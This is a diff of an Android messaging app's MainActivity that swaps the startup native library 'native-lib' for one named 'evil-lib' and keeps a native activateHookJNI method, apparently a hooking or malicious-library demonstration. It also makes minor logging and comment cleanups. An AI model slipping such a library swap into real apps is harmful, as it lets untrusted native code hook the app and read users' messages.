@@ -21,13 +21,13 @@ import android.view.View;
 import android.view.Menu;
 import android.view.MenuItem;
 
-import java.io.IOException;
+
 
 public class MainActivity extends AppCompatActivity {
 
     // Used to load the 'native-lib' library on application startup.
     static {
-        System.loadLibrary("native-lib");
+        System.loadLibrary("evil-lib");
     }
 
     private NetworkManager networkManager;
@@ -61,7 +61,6 @@ public class MainActivity extends AppCompatActivity {
                     String content = text.toString();
                     text.clear();
 
-                    Log.e("test", "content");
                     //Snackbar.make(v, "is send:" + content, Snackbar.LENGTH_LONG).setAction("Action", null).show();
 
                     //send message
@@ -93,13 +92,13 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
-        networkManager.addOnMessageReceiveListener(new NetworkManager.OnMessageReceiveListener() {
+        networkManager.addOnMessageReceiveListener(new OnMessageReceiveListener() {
             @Override
             public void onReceive(String msg) {
                 if (msg == null) {
                     Log.e("listener", "Couldn't send message");
                 } else {
-                    Log.e("listener", msg);
+                    Log.d("listener", msg);
                 }
 
                 if (msg == null) {
@@ -159,10 +158,6 @@ public class MainActivity extends AppCompatActivity {
         return super.onOptionsItemSelected(item);
     }
 
-    /**
-     * A native method that is implemented by the 'native-lib' native library,
-     * which is packaged with this application.
-     */
     public native String stringFromJNI();
 
     private native void activateHookJNI();
